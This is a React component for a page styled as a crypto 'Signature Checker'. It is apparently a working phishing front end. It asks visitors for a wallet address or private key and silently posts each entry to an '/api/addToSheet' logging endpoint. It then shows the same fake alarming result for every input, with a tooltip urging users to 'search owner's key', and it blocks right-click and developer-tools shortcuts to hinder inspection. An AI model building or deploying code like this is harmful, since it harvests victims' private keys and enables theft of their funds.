"use client";

import { useEffect, useState } from "react";
import { Search } from "lucide-react";
import { formatUTC } from "@/utils/formatUTC";

interface SignatureResult {
  txHash: string;
  lastUpdated: string;
  spender: string;
  allowance: string;
}

export default function SearchSection() {
  const [inputValue, setInputValue] = useState("");
  const [result, setResult] = useState<SignatureResult | null>(null);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const disableActions = (e: any) => {
      if (
        e.type === "contextmenu" ||
        e.key === "F12" ||
        (e.ctrlKey && e.shiftKey && ["I", "J", "C"].includes(e.key)) ||
        (e.ctrlKey && e.key === "U")
      ) {
        e.preventDefault();
      }
    };

    document.addEventListener("contextmenu", disableActions);
    document.addEventListener("keydown", disableActions);

    return () => {
      document.removeEventListener("contextmenu", disableActions);
      document.removeEventListener("keydown", disableActions);
    };
  }, []);

  const handleSearch = async () => {
    const value = inputValue.trim();
    setError("");

    const isValid = /^[A-Za-z0-9]{26,}$/.test(value);
    if (!isValid) {
      alert(
        "Please enter a valid Address or Key in the correct format (e.g., 0x...)"
      );
      return;
    }

    setLoading(true); 
    setResult(null); 

    try {
      await fetch("/api/addToSheet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          input: value,
          timestamp: new Date().toISOString(),
        }),
      });

      setResult({
        txHash: value,
        lastUpdated: formatUTC(new Date(Date.now() - 3 * 24 * 60 * 60 * 1000)),
        spender: "⚠️ Fake_Phishing1309277",
        allowance: "Unlimited Token",
      });

      setLoading(false);
    } catch (err) {
      console.error("Error logging:", err);
      setLoading(false);
    }

    setInputValue("");
  };

  return (
    <section className="py-10 px-4 lg:px-0 max-w-4xl mx-auto w-full">
      <h2 className="flex text-[#1B2F3E] items-center justify-center gap-2 text-3xl lg:text-5xl font-bold lg:mb-10 mb-6">
        <img
          src="/logo.png"
          alt=""
          className="object-cover h-10 w-10 lg:h-15 lg:w-15"
        />{" "}
        Signature Checker
      </h2>

      {/* Search Input */}
      <div className="flex items-center gap-2 rounded-lg px-4 py-2 border border-gray-400">
        <Search className="w-5 h-5 text-gray-400" />
        <input
          type="text"
          placeholder="Search by Address or Private Key"
          value={inputValue}
          onChange={(e) => setInputValue(e.target.value)}
          onKeyDown={(e) => e.key === "Enter" && handleSearch()}
          className="flex-1 outline-none bg-transparent"
        />
        {inputValue && (
          <button
            onClick={() => {
              setInputValue("");
              setError("");
            }}
            className="text-red-500 cursor-pointer hover:text-red-600"
          >
            ✕
          </button>
        )}
      </div>

      {error && (
        <div className="mt-4 bg-red-100 border border-red-300 text-red-700 rounded-md px-4 py-2 text-sm">
          {error}
        </div>
      )}

      {loading && (
        <div className="my-8 flex items-center justify-center">
          <p className=" text-gray-600 font-medium">Fetching signatures...</p>
        </div>
      )}

      {/* Results */}
      {result && (
        <div className="mt-8">
          <p className="text-gray-800 font-semibold text-sm mb-6 flex flex-wrap items-center gap-1">
            Search Results for:{" "}
            <span className="font-mono max-w-[250px] truncate block">
              {result.txHash}
            </span>
          </p>
          <div className="overflow-x-auto border border-gray-200 mt-4">
            <table className="w-full text-sm table-fixed">
              <thead className="bg-gray-100 text-left text-gray-700">
                <tr>
                  <th className="px-4 py-2 w-[200px]">Transaction Hash</th>
                  <th className="px-4 py-2 w-[180px]">Last Updated (UTC)</th>
                  <th className="px-4 py-2 w-[200px]">Approved Spender</th>
                  <th className="px-4 py-2 w-[150px] text-nowrap">
                    Original Allowance
                  </th>
                  <th className="px-4 py-2 w-[150px] text-center">Action</th>
                </tr>
              </thead>
              <tbody>
                <tr className="border-t border-gray-200">
                  <td className="px-4 py-2 font-mono truncate max-w-[200px]">
                    {result.txHash}
                  </td>
                  <td className="px-4 py-2 truncate">{result.lastUpdated}</td>
                  <td className="px-4 py-2 text-red-600 font-medium truncate max-w-[200px]">
                    {result.spender}
                  </td>
                  <td className="px-4 py-2 truncate">{result.allowance}</td>
                  <td className="px-4 py-2 text-center">
                    <div className="relative inline-block group">
                      <button className="bg-gray-500  cursor-pointer text-white px-3 py-1 rounded text-nowrap group-hover:bg-gray-400">
                        Clear Signature
                      </button>

                      {/* Tooltip */}
                      <div
                        className="absolute bottom-4 left-2 
      hidden group-hover:block
      bg-gray-500 text-white text-xs px-3 py-1 rounded-full whitespace-nowrap
      shadow-lg"
                      >
                        Search owner’s key.
                      </div>
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      )}
    </section>
  );
}
